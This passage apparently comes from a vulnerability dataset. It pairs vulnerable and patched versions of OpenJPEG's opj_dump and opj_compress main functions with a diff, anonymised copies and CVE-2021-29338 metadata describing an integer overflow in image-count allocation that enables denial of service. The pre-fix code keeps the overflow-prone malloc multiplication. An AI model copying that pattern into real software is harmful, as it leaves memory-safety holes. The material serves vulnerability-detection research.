        case VAR_21: { /* COMMENT_15 */
            /* COMMENT_16 */
            VAR_5 = opj_create_decompress(VAR_22);
            break;
        }
        case VAR_23: { /* COMMENT_17 */
            /* COMMENT_16 */
            VAR_5 = opj_create_decompress(VAR_24);
            break;
        }
        case VAR_25: { /* COMMENT_18 */
            /* COMMENT_16 */
            VAR_5 = opj_create_decompress(VAR_26);
            break;
        }
        default:
            fprintf(VAR_20, ""skipping file..\n"");
            opj_stream_destroy(VAR_6);
            continue;
        }

        /* COMMENT_19 */
        opj_set_info_handler(VAR_5, VAR_27, 00);
        opj_set_warning_handler(VAR_5, VAR_28, 00);
        opj_set_error_handler(VAR_5, VAR_29, 00);

        VAR_3.flags |= VAR_30;

        /* COMMENT_20 */
        if (!opj_setup_decoder(VAR_5, &VAR_3)) {
            fprintf(VAR_20, ""ERROR -> opj_dump: failed to setup the decoder\n"");
            opj_stream_destroy(VAR_6);
            opj_destroy_codec(VAR_5);
            fclose(VAR_2);
            goto fails;
        }

        /* COMMENT_21 */
        if (! opj_read_header(VAR_6, VAR_5, &VAR_4)) {
            fprintf(VAR_20, ""ERROR -> opj_dump: failed to read the header\n"");
            opj_stream_destroy(VAR_6);
            opj_destroy_codec(VAR_5);
            opj_image_destroy(VAR_4);
            fclose(VAR_2);
            goto fails;
        }

        opj_dump_codec(VAR_5, VAR_11.flag, VAR_2);

        VAR_7 = opj_get_cstr_info(VAR_5);

        VAR_8 = opj_get_cstr_index(VAR_5);

        /* COMMENT_22 */
        opj_stream_destroy(VAR_6);

        /* COMMENT_23 */
        if (VAR_5) {
            opj_destroy_codec(VAR_5);
        }

        /* COMMENT_24 */
        opj_image_destroy(VAR_4);

        /* COMMENT_25 */
        opj_destroy_cstr_index(&VAR_8);

        /* COMMENT_26 */
        opj_destroy_cstr_info(&VAR_7);

    }

    /* COMMENT_27 */
    fclose(VAR_2);

    return VAR_31;

fails:
    if (VAR_12) {
        if (VAR_12->filename) {
            free(VAR_12->filename);
        }
        if (VAR_12->filename_buf) {
            free(VAR_12->filename_buf);
        }
        free(VAR_12);
    }
    return VAR_16;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_dump.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -38,13 +38,14 @@
         if (!dirptr) {
             return EXIT_FAILURE;
         }
-        dirptr->filename_buf = (char*)malloc((size_t)num_images * OPJ_PATH_LEN * sizeof(
-                char)); /* Stores at max 10 image file names*/
+        /* Stores at max 10 image file names*/
+        dirptr->filename_buf = (char*) calloc((size_t) num_images,
+                                              OPJ_PATH_LEN * sizeof(char));
         if (!dirptr->filename_buf) {
             free(dirptr);
             return EXIT_FAILURE;
         }
-        dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));
+        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));
 
         if (!dirptr->filename) {
             goto fails;","{'deleted_lines': ['        dirptr->filename_buf = (char*)malloc((size_t)num_images * OPJ_PATH_LEN * sizeof(', '                char)); /* Stores at max 10 image file names*/', '        dirptr->filename = (char**) malloc((size_t)num_images * sizeof(char*));'], 'added_lines': ['        /* Stores at max 10 image file names*/', '        dirptr->filename_buf = (char*) calloc((size_t) num_images,', '                                              OPJ_PATH_LEN * sizeof(char));', '        dirptr->filename = (char**) calloc((size_t) num_images, sizeof(char*));']}",True,"Integer Overflow in OpenJPEG v2.4.0 allows remote attackers to crash the application, causing a Denial of Service (DoS). This occurs when the attacker uses the command line option ""-ImgDir"" on a directory that contains 1048576 files.",5.5,MEDIUM,1,valid,2022-01-12T11:20:28Z,4
CVE-2021-29338,['CWE-190'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,uclouvain/openjpeg,"Fix integer overflow in num_images

Includes the fix for CVE-2021-29338
Credit to @kaniini based on #1346
Fixes #1338",f0727df07c4d944d7d1c5002451cfbc9545d3288,https://github.com/uclouvain/openjpeg/commit/f0727df07c4d944d7d1c5002451cfbc9545d3288,src/bin/jp2/opj_compress.c,main,"int main(int argc, char **argv)
{
opj_cparameters_t parameters;   
opj_stream_t *l_stream = 00;
opj_codec_t* l_codec = 00;
opj_image_t *image = NULL;
raw_cparameters_t raw_cp;
OPJ_SIZE_T num_compressed_files = 0;
char indexfilename[OPJ_PATH_LEN];   
unsigned int i, num_images, imageno;
img_fol_t img_fol;
dircnt_t *dirptr = NULL;
int ret = 0;
OPJ_BOOL bSuccess;
OPJ_BOOL bUseTiles = OPJ_FALSE; 
OPJ_UINT32 l_nb_tiles = 4;
int framerate = 0;
OPJ_FLOAT64 t = opj_clock();
OPJ_BOOL PLT = OPJ_FALSE;
OPJ_BOOL TLM = OPJ_FALSE;
int num_threads = 0;
unsigned int target_bitdepth = 0;
opj_set_default_encoder_parameters(&parameters);
*indexfilename = 0;
memset(&img_fol, 0, sizeof(img_fol_t));
raw_cp.rawBitDepth = 0;
raw_cp.rawComp = 0;
raw_cp.rawComps = 0;
raw_cp.rawHeight = 0;
raw_cp.rawSigned = 0;
raw_cp.rawWidth = 0;
parameters.tcp_mct = (char)
255; 
if (parse_cmdline_encoder(argc, argv, &parameters, &img_fol, &raw_cp,
indexfilename, sizeof(indexfilename), &framerate, &PLT, &TLM,
&num_threads, &target_bitdepth) == 1) {
ret = 1;
goto fin;
}
if (img_fol.set_imgdir == 1) {
num_images = get_num_images(img_fol.imgdirpath);
dirptr = (dircnt_t*)malloc(sizeof(dircnt_t));
if (dirptr) {
dirptr->filename_buf = (char*)malloc(num_images * OPJ_PATH_LEN * sizeof(
char)); 
dirptr->filename = (char**) malloc(num_images * sizeof(char*));
if (!dirptr->filename_buf) {
ret = 0;
goto fin;
}
for (i = 0; i < num_images; i++) {
dirptr->filename[i] = dirptr->filename_buf + i * OPJ_PATH_LEN;
}
}
if (load_images(dirptr, img_fol.imgdirpath) == 1) {
ret = 0;
goto fin;
}
if (num_images == 0) {
fprintf(stdout, ""Folder is empty\n"");
ret = 0;
goto fin;
}
} else {
num_images = 1;
}
for (imageno = 0; imageno < num_images; imageno++) {
image = NULL;
fprintf(stderr, ""\n"");
if (img_fol.set_imgdir == 1) {
if (get_next_file((int)imageno, dirptr, &img_fol, &parameters)) {
fprintf(stderr, ""skipping file...\n"");
continue;
}
}
switch (parameters.decod_format) {
case PGX_DFMT:
case PXM_DFMT:
case BMP_DFMT:
case TIF_DFMT:
case RAW_DFMT:
case RAWL_DFMT:
case TGA_DFMT:
case PNG_DFMT:
break;
default:
fprintf(stderr, ""skipping file...\n"");
continue;
}
switch (parameters.decod_format) {
case PGX_DFMT:
image = pgxtoimage(parameters.infile, &parameters);
if (!image) {
fprintf(stderr, ""Unable to load pgx file\n"");
ret = 1;
goto fin;
}
break;
case PXM_DFMT:
image = pnmtoimage(parameters.infile, &parameters);
if (!image) {
fprintf(stderr, ""Unable to load pnm file\n"");
ret = 1;
goto fin;
}
break;
case BMP_DFMT:
image = bmptoimage(parameters.infile, &parameters);
if (!image) {
fprintf(stderr, ""Unable to load bmp file\n"");
ret = 1;
goto fin;
}
break;
#ifdef OPJ_HAVE_LIBTIFF
case TIF_DFMT:
image = tiftoimage(parameters.infile, &parameters, target_bitdepth);
if (!image) {
fprintf(stderr, ""Unable to load tif(f) file\n"");
ret = 1;
goto fin;
}
break;
#endif 
case RAW_DFMT:
image = rawtoimage(parameters.infile, &parameters, &raw_cp);
if (!image) {
fprintf(stderr, ""Unable to load raw or yuv file\n"");
ret = 1;
goto fin;
}
break;
case RAWL_DFMT:
image = rawltoimage(parameters.infile, &parameters, &raw_cp);
if (!image) {
fprintf(stderr, ""Unable to load raw file\n"");
ret = 1;
goto fin;
}
break;
case TGA_DFMT:
image = tgatoimage(parameters.infile, &parameters);
if (!image) {
fprintf(stderr, ""Unable to load tga file\n"");
ret = 1;
goto fin;
}
break;
#ifdef OPJ_HAVE_LIBPNG
case PNG_DFMT:
image = pngtoimage(parameters.infile, &parameters);
if (!image) {
fprintf(stderr, ""Unable to load png file\n"");
ret = 1;
goto fin;
}
break;
#endif 
}
if (!image) {
fprintf(stderr, ""Unable to load file: got no image\n"");
ret = 1;
goto fin;
}
if (parameters.tcp_mct == (char)
255) { 
parameters.tcp_mct = (image->numcomps >= 3) ? 1 : 0;
} else {            
if ((parameters.tcp_mct == 1) && (image->numcomps < 3)) {
fprintf(stderr, ""RGB->YCC conversion cannot be used:\n"");
fprintf(stderr, ""Input image has less than 3 components\n"");
ret = 1;
goto fin;
}
if ((parameters.tcp_mct == 2) && (!parameters.mct_data)) {
fprintf(stderr, ""Custom MCT has been set but no array-based MCT\n"");
fprintf(stderr, ""has been provided. Aborting.\n"");
ret = 1;
goto fin;
}
}
if (OPJ_IS_IMF(parameters.rsiz) && framerate > 0) {
const int mainlevel = OPJ_GET_IMF_MAINLEVEL(parameters.rsiz);
if (mainlevel > 0 && mainlevel <= OPJ_IMF_MAINLEVEL_MAX) {
const int limitMSamplesSec[] = {
0,
OPJ_IMF_MAINLEVEL_1_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_2_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_3_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_4_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_5_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_6_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_7_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_8_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_9_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_10_MSAMPLESEC,
OPJ_IMF_MAINLEVEL_11_MSAMPLESEC
};
OPJ_UINT32 avgcomponents = image->numcomps;
double msamplespersec;
if (image->numcomps == 3 &&
image->comps[1].dx == 2 &&
image->comps[1].dy == 2) {
avgcomponents = 2;
}
msamplespersec = (double)image->x1 * image->y1 * avgcomponents * framerate /
1e6;
if (msamplespersec > limitMSamplesSec[mainlevel]) {
fprintf(stderr,
""Warning: MSamples/sec is %f, whereas limit is %d.\n"",
msamplespersec,
limitMSamplesSec[mainlevel]);
}
}
}
switch (parameters.cod_format) {
case J2K_CFMT: { 
l_codec = opj_create_compress(OPJ_CODEC_J2K);
break;
}
case JP2_CFMT: { 
l_codec = opj_create_compress(OPJ_CODEC_JP2);
break;
}
default:
fprintf(stderr, ""skipping file..\n"");
opj_stream_destroy(l_stream);
continue;
}
opj_set_info_handler(l_codec, info_callback, 00);
opj_set_warning_handler(l_codec, warning_callback, 00);
opj_set_error_handler(l_codec, error_callback, 00);
if (bUseTiles) {
parameters.cp_tx0 = 0;
parameters.cp_ty0 = 0;
parameters.tile_size_on = OPJ_TRUE;
parameters.cp_tdx = 512;
parameters.cp_tdy = 512;
}
if (! opj_setup_encoder(l_codec, &parameters, image)) {
fprintf(stderr, ""failed to encode image: opj_setup_encoder\n"");
opj_destroy_codec(l_codec);
opj_image_destroy(image);
ret = 1;
goto fin;
}
if (PLT || TLM) {
const char* options[3] = { NULL, NULL, NULL };
int iOpt = 0;
if (PLT) {
options[iOpt++] = ""PLT=YES"";
}
if (TLM) {
options[iOpt++] = ""TLM=YES"";
}
(void)iOpt;
if (!opj_encoder_set_extra_options(l_codec, options)) {
fprintf(stderr, ""failed to encode image: opj_encoder_set_extra_options\n"");
opj_destroy_codec(l_codec);
opj_image_destroy(image);
ret = 1;
goto fin;
}
}
if (num_threads >= 1 &&
!opj_codec_set_threads(l_codec, num_threads)) {
fprintf(stderr, ""failed to set number of threads\n"");
opj_destroy_codec(l_codec);
opj_image_destroy(image);
ret = 1;
goto fin;
}
l_stream = opj_stream_create_default_file_stream(parameters.outfile, OPJ_FALSE);
if (! l_stream) {
ret = 1;
goto fin;
}
bSuccess = opj_start_compress(l_codec, image, l_stream);
if (!bSuccess)  {
fprintf(stderr, ""failed to encode image: opj_start_compress\n"");
}
if (bSuccess && bUseTiles) {
OPJ_BYTE *l_data;
OPJ_UINT32 l_data_size = 512 * 512 * 3;
l_data = (OPJ_BYTE*) calloc(1, l_data_size);
if (l_data == NULL) {
ret = 1;
goto fin;
}
for (i = 0; i < l_nb_tiles; ++i) {
if (! opj_write_tile(l_codec, i, l_data, l_data_size, l_stream)) {
fprintf(stderr, ""ERROR -> test_tile_encoder: failed to write the tile %d!\n"",
i);
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
ret = 1;
goto fin;
}
}
free(l_data);
} else {
bSuccess = bSuccess && opj_encode(l_codec, l_stream);
if (!bSuccess)  {
fprintf(stderr, ""failed to encode image: opj_encode\n"");
}
}
bSuccess = bSuccess && opj_end_compress(l_codec, l_stream);
if (!bSuccess)  {
fprintf(stderr, ""failed to encode image: opj_end_compress\n"");
}
if (!bSuccess)  {
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
fprintf(stderr, ""failed to encode image\n"");
remove(parameters.outfile);
ret = 1;
goto fin;
}
num_compressed_files++;
fprintf(stdout, ""[INFO] Generated outfile %s\n"", parameters.outfile);
opj_stream_destroy(l_stream);
opj_destroy_codec(l_codec);
opj_image_destroy(image);
}
t = opj_clock() - t;
if (num_compressed_files) {
fprintf(stdout, ""encode time: %d ms \n"",
(int)((t * 1000.0) / (OPJ_FLOAT64)num_compressed_files));
}
ret = 0;
fin:
if (parameters.cp_comment) {
free(parameters.cp_comment);
}
if (parameters.cp_matrice) {
free(parameters.cp_matrice);
}
if (raw_cp.rawComps) {
free(raw_cp.rawComps);
}
if (img_fol.imgdirpath) {
free(img_fol.imgdirpath);
}
if (dirptr) {
if (dirptr->filename_buf) {
free(dirptr->filename_buf);
}
if (dirptr->filename) {
free(dirptr->filename);
}
free(dirptr);
}
return ret;
}","int main(int VAR_0, char **VAR_1)
{
opj_cparameters_t VAR_2;   
opj_stream_t *VAR_3 = 00;
opj_codec_t* VAR_4 = 00;
opj_image_t *VAR_5 = NULL;
raw_cparameters_t VAR_6;
OPJ_SIZE_T VAR_7 = 0;
char VAR_8[VAR_9];   
unsigned int VAR_10, VAR_11, VAR_12;
img_fol_t VAR_13;
dircnt_t *VAR_14 = NULL;
int VAR_15 = 0;
OPJ_BOOL VAR_16;
OPJ_BOOL VAR_17 = VAR_18; 
OPJ_UINT32 VAR_19 = 4;
int VAR_20 = 0;
OPJ_FLOAT64 VAR_21 = opj_clock();
OPJ_BOOL VAR_22 = VAR_18;
OPJ_BOOL VAR_23 = VAR_18;
int VAR_24 = 0;
unsigned int VAR_25 = 0;
opj_set_default_encoder_parameters(&VAR_2);
*VAR_8 = 0;
memset(&VAR_13, 0, sizeof(img_fol_t));
VAR_6.rawBitDepth = 0;
VAR_6.rawComp = 0;
VAR_6.rawComps = 0;
VAR_6.rawHeight = 0;
VAR_6.rawSigned = 0;
VAR_6.rawWidth = 0;
VAR_2.tcp_mct = (char)
255; 
if (parse_cmdline_encoder(VAR_0, VAR_1, &VAR_2, &VAR_13, &VAR_6,
VAR_8, sizeof(VAR_8), &VAR_20, &VAR_22, &VAR_23,
&VAR_24, &VAR_25) == 1) {
VAR_15 = 1;
goto fin;
}
if (VAR_13.set_imgdir == 1) {
VAR_11 = get_num_images(VAR_13.imgdirpath);
VAR_14 = (dircnt_t*)malloc(sizeof(dircnt_t));
if (VAR_14) {
VAR_14->filename_buf = (char*)malloc(VAR_11 * VAR_9 * sizeof(
char)); 
VAR_14->filename = (char**) malloc(VAR_11 * sizeof(char*));
if (!VAR_14->filename_buf) {
VAR_15 = 0;
goto fin;
}
for (VAR_10 = 0; VAR_10 < VAR_11; VAR_10++) {
VAR_14->filename[VAR_10] = VAR_14->filename_buf + VAR_10 * VAR_9;
}
}
if (load_images(VAR_14, VAR_13.imgdirpath) == 1) {
VAR_15 = 0;
goto fin;
}
if (VAR_11 == 0) {
fprintf(VAR_26, ""Folder is empty\n"");
VAR_15 = 0;
goto fin;
}
} else {
VAR_11 = 1;
}
for (VAR_12 = 0; VAR_12 < VAR_11; VAR_12++) {
VAR_5 = NULL;
fprintf(VAR_27, ""\n"");
if (VAR_13.set_imgdir == 1) {
if (get_next_file((int)VAR_12, VAR_14, &VAR_13, &VAR_2)) {
fprintf(VAR_27, ""skipping file...\n"");
continue;
}
}
switch (VAR_2.decod_format) {
case VAR_28:
case VAR_29:
case VAR_30:
case VAR_31:
case VAR_32:
case VAR_33:
case VAR_34:
case VAR_35:
break;
default:
fprintf(VAR_27, ""skipping file...\n"");
continue;
}
switch (VAR_2.decod_format) {
case VAR_28:
VAR_5 = pgxtoimage(VAR_2.infile, &VAR_2);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load pgx file\n"");
VAR_15 = 1;
goto fin;
}
break;
case VAR_29:
VAR_5 = pnmtoimage(VAR_2.infile, &VAR_2);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load pnm file\n"");
VAR_15 = 1;
goto fin;
}
break;
case VAR_30:
VAR_5 = bmptoimage(VAR_2.infile, &VAR_2);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load bmp file\n"");
VAR_15 = 1;
goto fin;
}
break;
#ifdef VAR_36
case VAR_31:
VAR_5 = tiftoimage(VAR_2.infile, &VAR_2, VAR_25);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load tif(f) file\n"");
VAR_15 = 1;
goto fin;
}
break;
#endif 
case VAR_32:
VAR_5 = rawtoimage(VAR_2.infile, &VAR_2, &VAR_6);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load raw or yuv file\n"");
VAR_15 = 1;
goto fin;
}
break;
case VAR_33:
VAR_5 = rawltoimage(VAR_2.infile, &VAR_2, &VAR_6);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load raw file\n"");
VAR_15 = 1;
goto fin;
}
break;
case VAR_34:
VAR_5 = tgatoimage(VAR_2.infile, &VAR_2);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load tga file\n"");
VAR_15 = 1;
goto fin;
}
break;
#ifdef VAR_37
case VAR_35:
VAR_5 = pngtoimage(VAR_2.infile, &VAR_2);
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load png file\n"");
VAR_15 = 1;
goto fin;
}
break;
#endif 
}
if (!VAR_5) {
fprintf(VAR_27, ""Unable to load file: got no image\n"");
VAR_15 = 1;
goto fin;
}
if (VAR_2.tcp_mct == (char)
255) { 
VAR_2.tcp_mct = (VAR_5->numcomps >= 3) ? 1 : 0;
} else {            
if ((VAR_2.tcp_mct == 1) && (VAR_5->numcomps < 3)) {
fprintf(VAR_27, ""RGB->YCC conversion cannot be used:\n"");
fprintf(VAR_27, ""Input image has less than 3 components\n"");
VAR_15 = 1;
goto fin;
}
if ((VAR_2.tcp_mct == 2) && (!VAR_2.mct_data)) {
fprintf(VAR_27, ""Custom MCT has been set but no array-based MCT\n"");
fprintf(VAR_27, ""has been provided. Aborting.\n"");
VAR_15 = 1;
goto fin;
}
}
if (OPJ_IS_IMF(VAR_2.rsiz) && VAR_20 > 0) {
const int VAR_38 = OPJ_GET_IMF_MAINLEVEL(VAR_2.rsiz);
if (VAR_38 > 0 && VAR_38 <= VAR_39) {
const int VAR_40[] = {
0,
VAR_41,
VAR_42,
VAR_43,
VAR_44,
VAR_45,
VAR_46,
VAR_47,
VAR_48,
VAR_49,
VAR_50,
VAR_51
};
OPJ_UINT32 VAR_52 = VAR_5->numcomps;
double VAR_53;
if (VAR_5->numcomps == 3 &&
VAR_5->comps[1].dx == 2 &&
VAR_5->comps[1].dy == 2) {
VAR_52 = 2;
}
VAR_53 = (double)VAR_5->x1 * VAR_5->y1 * VAR_52 * VAR_20 /
1e6;
if (VAR_53 > VAR_40[VAR_38]) {
fprintf(VAR_27,
""Warning: MSamples/sec is %f, whereas limit is %d.\n"",
VAR_53,
VAR_40[VAR_38]);
}
}
}
switch (VAR_2.cod_format) {
case VAR_54: { 
VAR_4 = opj_create_compress(VAR_55);
break;
}
case VAR_56: { 
VAR_4 = opj_create_compress(VAR_57);
break;
}
default:
fprintf(VAR_27, ""skipping file..\n"");
opj_stream_destroy(VAR_3);
continue;
}
opj_set_info_handler(VAR_4, VAR_58, 00);
opj_set_warning_handler(VAR_4, VAR_59, 00);
opj_set_error_handler(VAR_4, VAR_60, 00);
if (VAR_17) {
VAR_2.cp_tx0 = 0;
VAR_2.cp_ty0 = 0;
VAR_2.tile_size_on = VAR_61;
VAR_2.cp_tdx = 512;
VAR_2.cp_tdy = 512;
}
if (! opj_setup_encoder(VAR_4, &VAR_2, VAR_5)) {
fprintf(VAR_27, ""failed to encode image: opj_setup_encoder\n"");
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
VAR_15 = 1;
goto fin;
}
if (VAR_22 || VAR_23) {
const char* VAR_62[3] = { NULL, NULL, NULL };
int VAR_63 = 0;
if (VAR_22) {
VAR_62[VAR_63++] = ""PLT=YES"";
}
if (VAR_23) {
VAR_62[VAR_63++] = ""TLM=YES"";
}
(void)VAR_63;
if (!opj_encoder_set_extra_options(VAR_4, VAR_62)) {
fprintf(VAR_27, ""failed to encode image: opj_encoder_set_extra_options\n"");
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
VAR_15 = 1;
goto fin;
}
}
if (VAR_24 >= 1 &&
!opj_codec_set_threads(VAR_4, VAR_24)) {
fprintf(VAR_27, ""failed to set number of threads\n"");
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
VAR_15 = 1;
goto fin;
}
VAR_3 = opj_stream_create_default_file_stream(VAR_2.outfile, VAR_18);
if (! VAR_3) {
VAR_15 = 1;
goto fin;
}
VAR_16 = opj_start_compress(VAR_4, VAR_5, VAR_3);
if (!VAR_16)  {
fprintf(VAR_27, ""failed to encode image: opj_start_compress\n"");
}
if (VAR_16 && VAR_17) {
OPJ_BYTE *VAR_64;
OPJ_UINT32 VAR_65 = 512 * 512 * 3;
VAR_64 = (OPJ_BYTE*) calloc(1, VAR_65);
if (VAR_64 == NULL) {
VAR_15 = 1;
goto fin;
}
for (VAR_10 = 0; VAR_10 < VAR_19; ++VAR_10) {
if (! opj_write_tile(VAR_4, VAR_10, VAR_64, VAR_65, VAR_3)) {
fprintf(VAR_27, ""ERROR -> test_tile_encoder: failed to write the tile %d!\n"",
VAR_10);
opj_stream_destroy(VAR_3);
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
VAR_15 = 1;
goto fin;
}
}
free(VAR_64);
} else {
VAR_16 = VAR_16 && opj_encode(VAR_4, VAR_3);
if (!VAR_16)  {
fprintf(VAR_27, ""failed to encode image: opj_encode\n"");
}
}
VAR_16 = VAR_16 && opj_end_compress(VAR_4, VAR_3);
if (!VAR_16)  {
fprintf(VAR_27, ""failed to encode image: opj_end_compress\n"");
}
if (!VAR_16)  {
opj_stream_destroy(VAR_3);
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
fprintf(VAR_27, ""failed to encode image\n"");
remove(VAR_2.outfile);
VAR_15 = 1;
goto fin;
}
VAR_7++;
fprintf(VAR_26, ""[INFO] Generated outfile %s\n"", VAR_2.outfile);
opj_stream_destroy(VAR_3);
opj_destroy_codec(VAR_4);
opj_image_destroy(VAR_5);
}
VAR_21 = opj_clock() - VAR_21;
if (VAR_7) {
fprintf(VAR_26, ""encode time: %d ms \n"",
(int)((VAR_21 * 1000.0) / (OPJ_FLOAT64)VAR_7));
}
VAR_15 = 0;
fin:
if (VAR_2.cp_comment) {
free(VAR_2.cp_comment);
}
if (VAR_2.cp_matrice) {
free(VAR_2.cp_matrice);
}
if (VAR_6.rawComps) {
free(VAR_6.rawComps);
}
if (VAR_13.imgdirpath) {
free(VAR_13.imgdirpath);
}
if (VAR_14) {
if (VAR_14->filename_buf) {
free(VAR_14->filename_buf);
}
if (VAR_14->filename) {
free(VAR_14->filename);
}
free(VAR_14);
}
return VAR_15;
}",uclouvain/openjpeg/f0727df07c4d944d7d1c5002451cfbc9545d3288/opj_compress.c/vul/before/0.json,"int main(int argc, char **argv)
{

    opj_cparameters_t parameters;   /* compression parameters */

    opj_stream_t *l_stream = 00;
    opj_codec_t* l_codec = 00;
    opj_image_t *image = NULL;
    raw_cparameters_t raw_cp;
    OPJ_SIZE_T num_compressed_files = 0;

    char indexfilename[OPJ_PATH_LEN];   /* index file name */

    unsigned int i, num_images, imageno;
    img_fol_t img_fol;
    dircnt_t *dirptr = NULL;

    int ret = 0;

    OPJ_BOOL bSuccess;
    OPJ_BOOL bUseTiles = OPJ_FALSE; /* OPJ_TRUE */
    OPJ_UINT32 l_nb_tiles = 4;
    int framerate = 0;
    OPJ_FLOAT64 t = opj_clock();

    OPJ_BOOL PLT = OPJ_FALSE;
    OPJ_BOOL TLM = OPJ_FALSE;
    int num_threads = 0;

    /** desired bitdepth from input file */
    unsigned int target_bitdepth = 0;

    /* set encoding parameters to default values */
    opj_set_default_encoder_parameters(&parameters);

    /* Initialize indexfilename and img_fol */
    *indexfilename = 0;
    memset(&img_fol, 0, sizeof(img_fol_t));

    /* raw_cp initialization */
    raw_cp.rawBitDepth = 0;
    raw_cp.rawComp = 0;
    raw_cp.rawComps = 0;
    raw_cp.rawHeight = 0;
    raw_cp.rawSigned = 0;
    raw_cp.rawWidth = 0;

    /* parse input and get user encoding parameters */
    parameters.tcp_mct = (char)
                         255; /* This will be set later according to the input image or the provided option */
    if (parse_cmdline_encoder(argc, argv, &parameters, &img_fol, &raw_cp,
                              indexfilename, sizeof(indexfilename), &framerate, &PLT, &TLM,
                              &num_threads, &target_bitdepth) == 1) {
        ret = 1;
        goto fin;
    }

    /* Read directory if necessary */
    if (img_fol.set_imgdir == 1) {
        num_images = get_num_images(img_fol.imgdirpath);
        dirptr = (dircnt_t*)malloc(sizeof(dircnt_t));
        if (dirptr) {
            dirptr->filename_buf = (char*)calloc(num_images, OPJ_PATH_LEN * sizeof(
                    char)); /* Stores at max 10 image file names*/
            dirptr->filename = (char**) calloc(num_images, sizeof(char*));
            if (!dirptr->filename_buf) {
                ret = 0;
                goto fin;
            }
            for (i = 0; i < num_images; i++) {
                dirptr->filename[i] = dirptr->filename_buf + i * OPJ_PATH_LEN;
            }
        }
        if (load_images(dirptr, img_fol.imgdirpath) == 1) {
            ret = 0;
            goto fin;
        }
        if (num_images == 0) {
            fprintf(stdout, ""Folder is empty\n"");
            ret = 0;
            goto fin;
        }
    } else {
        num_images = 1;
    }
    /*Encoding image one by one*/
    for (imageno = 0; imageno < num_images; imageno++) {
        image = NULL;
        fprintf(stderr, ""\n"");

        if (img_fol.set_imgdir == 1) {
            if (get_next_file((int)imageno, dirptr, &img_fol, &parameters)) {
                fprintf(stderr, ""skipping file...\n"");
                continue;
            }
        }

        switch (parameters.decod_format) {
        case PGX_DFMT:
        case PXM_DFMT:
        case BMP_DFMT:
        case TIF_DFMT:
        case RAW_DFMT:
        case RAWL_DFMT:
        case TGA_DFMT:
        case PNG_DFMT:
            break;
        default:
            fprintf(stderr, ""skipping file...\n"");
            continue;
        }

        /* decode the source image */
        /* ----------------------- */

        switch (parameters.decod_format) {
        case PGX_DFMT:
            image = pgxtoimage(parameters.infile, &parameters);
            if (!image) {
                fprintf(stderr, ""Unable to load pgx file\n"");
                ret = 1;
                goto fin;
            }
            break;

        case PXM_DFMT:
            image = pnmtoimage(parameters.infile, &parameters);
            if (!image) {
                fprintf(stderr, ""Unable to load pnm file\n"");
                ret = 1;
                goto fin;
            }
            break;

        case BMP_DFMT:
            image = bmptoimage(parameters.infile, &parameters);
            if (!image) {
                fprintf(stderr, ""Unable to load bmp file\n"");
                ret = 1;
                goto fin;
            }
            break;

#ifdef OPJ_HAVE_LIBTIFF
        case TIF_DFMT:
            image = tiftoimage(parameters.infile, &parameters, target_bitdepth);
            if (!image) {
                fprintf(stderr, ""Unable to load tif(f) file\n"");
                ret = 1;
                goto fin;
            }
            break;
#endif /* OPJ_HAVE_LIBTIFF */

        case RAW_DFMT:
            image = rawtoimage(parameters.infile, &parameters, &raw_cp);
            if (!image) {
                fprintf(stderr, ""Unable to load raw or yuv file\n"");
                ret = 1;
                goto fin;
            }
            break;

        case RAWL_DFMT:
            image = rawltoimage(parameters.infile, &parameters, &raw_cp);
            if (!image) {
                fprintf(stderr, ""Unable to load raw file\n"");
                ret = 1;
                goto fin;
            }
            break;

        case TGA_DFMT:
            image = tgatoimage(parameters.infile, &parameters);
            if (!image) {
                fprintf(stderr, ""Unable to load tga file\n"");
                ret = 1;
                goto fin;
            }
            break;

#ifdef OPJ_HAVE_LIBPNG
        case PNG_DFMT:
            image = pngtoimage(parameters.infile, &parameters);
            if (!image) {
                fprintf(stderr, ""Unable to load png file\n"");
                ret = 1;
                goto fin;
            }
            break;
#endif /* OPJ_HAVE_LIBPNG */
        }

        /* Can happen if input file is TIF(F) or PNG
        * and OPJ_HAVE_LIBTIF or OPJ_HAVE_LIBPNG is undefined
        */
        if (!image) {
            fprintf(stderr, ""Unable to load file: got no image\n"");
            ret = 1;
            goto fin;
        }

        /* Decide if MCT should be used */
        if (parameters.tcp_mct == (char)
                255) { /* mct mode has not been set in commandline */
            parameters.tcp_mct = (image->numcomps >= 3) ? 1 : 0;
        } else {            /* mct mode has been set in commandline */
            if ((parameters.tcp_mct == 1) && (image->numcomps < 3)) {
                fprintf(stderr, ""RGB->YCC conversion cannot be used:\n"");
                fprintf(stderr, ""Input image has less than 3 components\n"");
                ret = 1;
                goto fin;
            }
            if ((parameters.tcp_mct == 2) && (!parameters.mct_data)) {
                fprintf(stderr, ""Custom MCT has been set but no array-based MCT\n"");
                fprintf(stderr, ""has been provided. Aborting.\n"");
                ret = 1;
                goto fin;
            }
        }

        if (OPJ_IS_IMF(parameters.rsiz) && framerate > 0) {
            const int mainlevel = OPJ_GET_IMF_MAINLEVEL(parameters.rsiz);
